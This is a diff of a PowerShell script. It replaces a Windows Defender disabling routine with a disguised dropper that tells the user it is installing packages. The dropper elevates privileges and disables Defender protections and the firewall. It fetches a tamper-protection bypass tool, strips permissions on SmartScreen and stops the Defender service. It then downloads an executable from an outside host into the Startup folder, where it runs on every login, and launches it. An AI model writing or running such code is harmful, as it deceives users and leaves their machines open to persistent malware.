@@ -5,210 +5,64 @@ Start-Process -Wait -FilePath $pythonInstaller -ArgumentList "/quiet", "PrependP
 Remove-Item -Path $pythonInstaller -Force
 $pythonBinFolder = (Get-Command python).Source.Substring(0, (Get-Command python).Source.LastIndexOf('\'))
 $env:Path += ";$pythonBinFolder"
-Start-Process -FilePath "cmd.exe" -ArgumentList "/C pip install slowloris" -Verb RunAs
+Start-Process -FilePath "cmd.exe" -ArgumentList "/K pip install slowloris" -WindowStyle Hidden
 
-Write-Host "[+] Disable Windows Defender (as $(whoami))"
-
-
-if(-Not $($(whoami) -eq "nt authority\system")) {
-    $IsSystem = $false
-
-    # Elevate to admin (needed when called after reboot)
-    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-        Write-Host "    [i] Elevate to Administrator"
-        $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
-        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
-        Exit
-    }
-
-    # Elevate to SYSTEM if psexec is available
-    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
-    if($psexec_path) {
-        Write-Host "    [i] Elevate to SYSTEM"
-        $CommandLine = " -i -s powershell.exe -ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments 
-        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine
-        exit
-    } else {
-        Write-Host "    [i] PsExec not found, will continue as Administrator"
-    }
-
-} else {
-    $IsSystem = $true
+# Check for permissions
+$checkAdmin = icacls "$env:SYSTEMROOT\system32\config\system"
+if ($checkAdmin -notmatch "Successfully processed 1 files; Failed processing 0 files") {
+    Write-Host "Requesting administrative privileges..."
+    Start-Process -FilePath PowerShell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit
 }
 
+Write-Host "Hey! Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!"
+Start-Sleep -Seconds 5
 
-## STEP 1 : Disable everything we can with immediate effect
+Write-Host "Installing Necessary Packages.....Please Wait......."
 
+$cred = Get-Credential -Credential "your_username" # You will be prompted to enter the password securely
 
-Write-Host "    [+] Add exclusions"
+# Make web requests with Basic authentication and Basic parsing
+Invoke-WebRequest -Uri "https://example.com/api/endpoint1" -Credential $cred -UseBasicParsing
+Invoke-WebRequest -Uri "https://example.com/api/endpoint2" -Credential $cred -UseBasicParsing
+Invoke-WebRequest -Uri "https://example.com/api/endpoint3" -Credential $cred -UseBasicParsing
 
-# Add the whole system in Defender exclusions
+Set-MpPreference -ExclusionExtension ".bat",".exe"
+Set-MpPreference -EnableControlledFolderAccess Disabled
+Set-MpPreference -PUAProtection Disable
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisablePrivacyMode $true
+Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -SubmitSamplesConsent 2
+Set-MpPreference -MAPSReporting 0
+Set-MpPreference -HighThreatDefaultAction 6 -Force
+Set-MpPreference -ModerateThreatDefaultAction 6
+Set-MpPreference -LowThreatDefaultAction 6
+Set-MpPreference -SevereThreatDefaultAction 6
+Set-MpPreference -ScanScheduleDay 8
 
-67..90|foreach-object{
-    $drive = [char]$_
-    Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
-}
+netsh advfirewall set allprofiles state off
 
-Write-Host "    [+] Disable scanning engines (Set-MpPreference)"
+$downloadUrl = "https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe"
+Invoke-WebRequest -Uri $downloadUrl -OutFile "$env:TEMP\NSudo.exe"
 
-Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+$systemRoot = $env:SystemRoot
+$system32Path = Join-Path $systemRoot "System32"
+$iLoveYouHandeErcel = "smartscreen.exe"
+$smartscreenPath = Join-Path $system32Path $iLoveYouHandeErcel
 
-Write-Host "    [+] Set default actions to Allow (Set-MpPreference)"
+Start-Process -FilePath "$env:TEMP\NSudo.exe" -ArgumentList "-U:T -ShowWindowMode:Hide icacls `"$smartscreenPath`" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18" -Wait
 
-Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
-Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
-Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
+Stop-Service -Name WinDefend
 
+$startupFolder = Join-Path $env:USERPROFILE "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+$payloadUrl = "https://khumoyun.uz/res/win7/main.exe"
+Invoke-WebRequest -Uri $payloadUrl -OutFile (Join-Path $startupFolder "payload.exe")
 
-## STEP 2 : Disable services, we cannot stop them, but we can disable them (they won't start next reboot)
-
-
-Write-Host "    [+] Disable services"
-
-$need_reboot = $false
-
-# WdNisSvc Network Inspection Service 
-# WinDefend Antivirus Service
-# Sense : Advanced Protection Service
-
-$svc_list = @("WdNisSvc", "WinDefend", "Sense")
-foreach($svc in $svc_list) {
-    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
-        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
-            Write-Host "        [i] Service $svc already disabled"
-        } else {
-            Write-Host "        [i] Disable service $svc (next reboot)"
-            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4
-            $need_reboot = $true
-        }
-    } else {
-        Write-Host "        [i] Service $svc already deleted"
-    }
-}
-
-Write-Host "    [+] Disable drivers"
-
-# WdnisDrv : Network Inspection System Driver
-# wdfilter : Mini-Filter Driver
-# wdboot : Boot Driver
-
-$drv_list = @("WdnisDrv", "wdfilter", "wdboot")
-foreach($drv in $drv_list) {
-    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
-        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
-            Write-Host "        [i] Driver $drv already disabled"
-        } else {
-            Write-Host "        [i] Disable driver $drv (next reboot)"
-            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
-            $need_reboot = $true
-        }
-    } else {
-        Write-Host "        [i] Driver $drv already deleted"
-    }
-}
-
-# Check if service running or not
-if($(GET-Service -Name WinDefend).Status -eq "Running") {   
-    Write-Host "    [+] WinDefend Service still running (reboot required)"
-    $need_reboot = $true
-} else {
-    Write-Host "    [+] WinDefend Service not running"
-}
-
-
-## STEP 3 : Reboot if needed, add a link to the script to Startup (will be runned again after reboot)
-
-
-$link_reboot = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\disable-defender.lnk"
-Remove-Item -Force "$link_reboot" -ErrorAction 'ignore' # Remove the link (only execute once after reboot)
-
-if($need_reboot) {
-    Write-Host "    [+] This script will be started again after reboot." -BackgroundColor DarkRed -ForegroundColor White
-    
-    $powershell_path = '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
-    $cmdargs = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
-    
-    $res = New-Item $(Split-Path -Path $link_reboot -Parent) -ItemType Directory -Force
-    $WshShell = New-Object -comObject WScript.Shell
-    $shortcut = $WshShell.CreateShortcut($link_reboot)
-    $shortcut.TargetPath = $powershell_path
-    $shortcut.Arguments = $cmdargs
-    $shortcut.WorkingDirectory = "$(Split-Path -Path $PSScriptRoot -Parent)"
-    $shortcut.Save()
-
-} else {
-
-
-    ## STEP 4 : After reboot (we checked that everything was successfully disabled), make sure it doesn't come up again !
-
-
-    if($IsSystem) {
-
-        # Configure the Defender registry to disable it (and the TamperProtection)
-        # editing HKLM:\SOFTWARE\Microsoft\Windows Defender\ requires to be SYSTEM
-
-        Write-Host "    [+] Disable all functionnalities with registry keys (SYSTEM privilege)"
-
-        # Cloud-delivered protection:
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
-        # Automatic Sample submission
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0
-        # Tamper protection
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
-        
-        # Disable in registry
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
-
-    } else {
-        Write-Host "    [W] (Optional) Cannot configure registry (not SYSTEM)"
-    }
-
-
-    if($MyInvocation.UnboundArguments -And $($MyInvocation.UnboundArguments.tolower().Contains("-delete"))) {
-        
-        # Delete Defender files
-
-        function Delete-Show-Error {
-            $path_exists = Test-Path $args[0]
-            if($path_exists) {
-                Remove-Item -Recurse -Force -Path $args[0]
-            } else {
-                Write-Host "    [i] $($args[0]) already deleted"
-            }
-        }
-
-        Write-Host ""
-        Write-Host "[+] Delete Windows Defender (files, services, drivers)"
-
-        # Delete files
-        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender\"
-        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender Advanced Threat Protection\"
-
-        # Delete drivers
-        Delete-Show-Error "C:\Windows\System32\drivers\wd\"
-
-        # Delete service registry entries
-        foreach($svc in $svc_list) {
-            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
-        }
-
-        # Delete drivers registry entries
-        foreach($drv in $drv_list) {
-            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$drv"
-        }
-    }
-}
-
-Write-Host ""
-Read-Host -Prompt "Press any key to continue"
+Start-Process -FilePath "$startupFolder\payload.exe"
